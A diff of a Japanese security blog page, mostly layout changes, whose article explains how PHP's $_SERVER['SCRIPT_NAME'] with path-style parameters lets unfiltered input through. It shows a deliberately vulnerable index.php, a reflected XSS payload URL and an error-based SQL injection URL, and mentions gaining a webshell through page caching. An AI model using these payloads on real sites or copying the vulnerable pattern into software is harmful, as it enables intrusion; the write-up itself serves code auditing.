@@ -123,7 +123,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -216,26 +216,61 @@
 <p>一部のWebサーバーでは、この変数を直接使用すると、SQLインジェクションまたはxssの脆弱性が発生する可能性があります。</p>
 <h1 id="0x01-テスト"><a href="#0x01-テスト" class="headerlink" title="0x01 テスト"></a>0x01 テスト</h1><p>Apache/2.4.23に　<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>変数があります。 私のローカルテスト環境は、<code>Apache/2.4.23（Win32）OpenSSL/1.0.2j PHP/5.5.38 MySQL/5.5.53</code>です。 現在Apache/2.4.23でのみ成功しています。</p>
 <p><code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>変数の公式ドキュメントは次のとおりです:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110601.png" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110601.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <p>簡単に言えば、この変数は、Webサービスのルートディレクトリから現在のファイルへのパスを返します。Webルートディレクトリが<code>/var/www/html</code>で、現在のファイルパスが<code>/var/www/html/t/index.php</code>であると仮定すると、<code>index.php</code>で取得された<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>は<code>/t/index.php</code>。</p>
 <p>上記は正常なプロセスです。 しかし、PHPにはパラメータを渡る方法が2種類があります。 1つは、<code>index.php?id =1</code>のような、キーと値のペアの伝統的な形式です。 もう一つのルートで、パラメータを渡すことです：<code>/index.php/xx/b/c</code>。<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>変数は、ルートでパラメータを渡すことにさらに有害です。</p>
 <p>ルートでパラメータを渡すのURLでは、URLの最後に　<code>/*</code>を追加することができます。つまり、ファイル名の後に<code>スペース + /*</code>を追加して、ファイル名を破棄して、ファイル名の後にデータを取得できます。</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110602.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110603.png" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110602.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110603.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <p>テストでは、<code>&#39;（一重引用符）&quot;（二重引用符）、;（セミコロン）&lt;&gt;（角カッコ）()（カッコ）</code>などのペイロードで一般的に使用される記号はフィルタリングされません。 一般的なCMSでは、一般にGET、POST、COOKIEの3つの変数のみがフィルタリングされます.GPCのグローバルエスケープが有効になっていても、<code>$_SERVER</code>変数はエスケープされません。</p>
 <p>特別な注意が必要なのは、ペイロードに<code>?</code>（疑問符）は表示されません、疑問符が切り捨てられ、ファイル名の後にデータを取得できなくなります。</p>
 <h1 id="0x02-使用方法"><a href="#0x02-使用方法" class="headerlink" title="0x02 使用方法"></a>0x02 使用方法</h1><p>私はかつてこのCMSに遭遇し、<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>をページに直接書きました。 このようにして、反射的なxss攻撃を実行できます。 さらに、CMSはヘッダを保護せずにphpファイルとして直接ページをキャッシュします。 言い換えれば、私たちが書くPHP文もキャッシュファイルにキャッシュされます。 WebShellを直接生成します。</p>
 <p>コード監査中に<code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>変数を追跡して、変数の値がデータベースに渡されるか、ページに直接渡されるかどうかを調べることができます。</p>
 <h1 id="0x03-ケーススタディ-XSS"><a href="#0x03-ケーススタディ-XSS" class="headerlink" title="0x03 ケーススタディ - XSS"></a>0x03 ケーススタディ - XSS</h1><p><code>index.php</code>コードは次のとおりです:  <?php echo $_SERVER['SCRIPT_NAME'];?>`</p>
 <p>exp: <code>http://localhost/index.php/&lt;img src=x onerror=alert(1)&gt; /\*</code></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110604.png" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110604.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <h1 id="0x04-ケーススタディ-SQLインジェクション"><a href="#0x04-ケーススタディ-SQLインジェクション" class="headerlink" title="0x04 ケーススタディ - SQLインジェクション"></a>0x04 ケーススタディ - SQLインジェクション</h1><p><code>index.php</code>コードは次のとおりです:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$db&#x3D;&quot;xx&quot;;</span><br><span class="line">$dbuser&#x3D;&quot;xxxxx&quot;;</span><br><span class="line">$dbpwd&#x3D;&quot;xxxx&quot;;</span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line"></span><br><span class="line">$mysql&#x3D;mysqli_connect($host,$dbuser,$dbpwd,$db) or die(&quot;connect failed&quot;);</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;select password from user where username&#x3D;&#39;&quot;.$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#39;&quot;;</span><br><span class="line">$result&#x3D;mysqli_query($mysql,$sql) or print_r(mysqli_error($mysql));</span><br><span class="line">$result_array&#x3D;mysqli_fetch_all($result);</span><br><span class="line"></span><br><span class="line">echo &quot;Your password is:&quot;.$result_array[0][0];</span><br></pre></td></tr></table></figure>
 
 <p>exp:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))||&#39; &#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110605.png" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2018110605.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 
         </div>
 
